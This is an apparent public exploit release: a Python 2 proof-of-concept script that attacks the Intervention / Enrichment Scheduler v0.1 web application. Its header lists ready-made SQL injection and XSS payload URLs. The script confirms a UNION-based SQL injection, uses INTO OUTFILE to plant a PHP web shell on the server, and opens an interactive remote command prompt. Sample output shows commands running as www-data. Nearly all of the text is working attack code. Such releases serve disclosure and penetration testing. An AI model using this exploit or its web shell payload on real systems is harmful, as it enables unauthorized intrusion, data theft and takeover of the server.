# Exploit Title: Intervention / Enrichment Scheduler v0.1 SQL Injection
# Date: 2018-07-28
# Exploit Author: Steve Kelly
# Software: https://sourceforge.net/projects/stusched/?source=directory

# Writeup: http://stevekelly.org.uk/2018/07/27/new-exploit-intervention-enrichment-scheduler-v0-1/
#          Contains documentation on 3 SQL injections and 2 XSS attacks
# SQL Injection:    studentview.php?id=-1%20UNION%20select%20null,%22test%22,null,null,null,null,null,null,null,null,null,null,null,null,null
# SQL Injection:    reports/teacherview.php?teacher=-1%27%20UNION%20select%20null,%22test%22,null,null,null,null,null,null,null,null,null,null,null,null,null%20--%20&
# SQL Injection:    studentsearch.php?student=%%27%20UNION%20select%20null,%22test%22,null,null,null,null,null,null,null,null,null,null,null,null,null%20--%20&button=Search+for+Student
# XSS (stored):     configuration/configsystem.php
# XSS (relected):   reports/teacherview.php?teacher=%3Cscript%3Ealert(%22test%22)%3C/script%3E&button=Search

# Tested on Python 2.7

# Intervention / Enrichment Scheduler is an old unmaintained piece of software
# Multiple SQL and XSS attacks found

# Example Output:
# ===============
# python poc.py http://192.168.80.138/scheduler/ /var/www/scheduler shell.php
# [+] Testing if target is vulnerable
# [+] Target appears to be vulnerable
# [+] Attempting to create a shell
# [+] Shell appears to have been created: http://192.168.80.138/scheduler//shell.php?cmd=id
# [+] Opening shell, type 'exit' to quit
# [PHP]$ pwd
# /var/www/scheduler
#
# [PHP]$ id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

import requests
import sys

if len(sys.argv) < 3:
    usage()

base_url = sys.argv[1]
upload_dir = sys.argv[2]
php_filename = sys.argv[3]

exploit_url = "/reports/teacherview.php"
payload = "<?php system($_GET['cmd']);?>"

def usage():
    print "Usage: " + sys.argv[0] + " <URL> <Upload_Path> <Shell_Name>"
    print "Example: " + sys.argv[0] + " http://localhost/scheduler /var/www/scheduler shell.php"
    exit()

def quit():
    print "[-] Exploit failed"
    exit()

def testVuln():
    testParam = "?teacher=-123%27%20UNION%20select%20%22exploitTest%22,null,null,null,null,null,null,null,null,null,null,null,null,null,null -- asd&button=Search"
    url = base_url + exploit_url + testParam
    response  = requests.get(url)
    status_code = response.status_code
    print "[+] Testing if target is vulnerable"
    if status_code == 200:
        if "id=exploitTest" in response.content:
            print "[+] Target appears to be vulnerable"
            return True
    print "[-] Target does not appear vulnerable"
    return False

def testShell():
    testParam = "?cmd=echo shellTest"
    url = base_url + "/" + php_filename + testParam
    response  = requests.get(url)
    status_code = response.status_code
    if status_code == 200:
        if "shellTest" in response.content:
            print "[+] Shell appears to have been created: " + base_url + "/" + php_filename + "?cmd=id"
            return True
    print "[-] Shell does not appear to exist"
    print "[-] This may have happened if " + upload_dir + " is not the same path as " + base_url
    print "[-] Alternatively try accessing it directly: " + base_url + "/" + php_filename + "?cmd=id"
    return False

def useShell():
    print "[+] Opening shell, type 'exit' to quit"
    while True:
        sys.stdout.write('[PHP]$ ')
        line = raw_input()
        if line == '':
            break
        if line == "exit":
            exit()
        cmdParam = "?cmd=" + line
        url = base_url + "/" + php_filename + cmdParam
        response  = requests.get(url)
        status_code = response.status_code
        if status_code == 200:
            print response.content
        else:
            print "[-] Shell not responding"

def createShell():
    shellParam = "?teacher=-123%27%20UNION%20select%20%22" + payload + "%22" + ",%22%22"*14 + " into OUTFILE '" + upload_dir + "/" + php_filename + "' -- asd&button=Search" 
    url = base_url + exploit_url + shellParam
    response  = requests.get(url)
    status_code = response.status_code
    print "[+] Attempting to create a shell"
    if status_code == 200:
        if not testShell():
            quit()
        return True
    print "[-] Hit some issues, but shell may have been created"
    print "[-] Try and access it directly: " + base_url + "/" + php_filename + "?cmd=id"
    return False

def run():
    if not testVuln():
        quit()
    if not createShell():
        quit()
    useShell()
    print "[+] Exploit succeeded"

run()
